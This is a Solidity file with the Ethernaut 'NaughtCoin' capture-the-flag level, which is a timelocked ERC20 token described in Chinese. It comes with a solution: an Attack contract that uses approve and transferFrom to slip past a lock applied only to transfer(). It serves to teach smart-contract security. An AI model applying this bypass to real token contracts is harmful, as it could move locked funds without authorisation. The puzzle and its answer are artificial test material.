// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * NaughtCoin 是一种 ERC20 代币，而且您已经持有这些代币。问题是您只能在 10 年之后才能转移它们。
 * 您能尝试将它们转移到另一个地址，以便您可以自由使用它们吗？通过将您的代币余额变为 0 来完成此关卡。
 *
 */
contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}

/**
 * 解题思路
 * 1.手动调用approve将所有余额授权给攻击合约
 * 2.通过攻击合约调用transferFrom函数将余额转出到其他账户
 */
contract Attack {
    function attack(NaughtCoin addr) public {
        uint256 balance = addr.balanceOf(msg.sender);
        addr.transferFrom(msg.sender, 0xC0b9Ea33197AEA1951Bc47105Be316a27ef48150, balance);
    }
}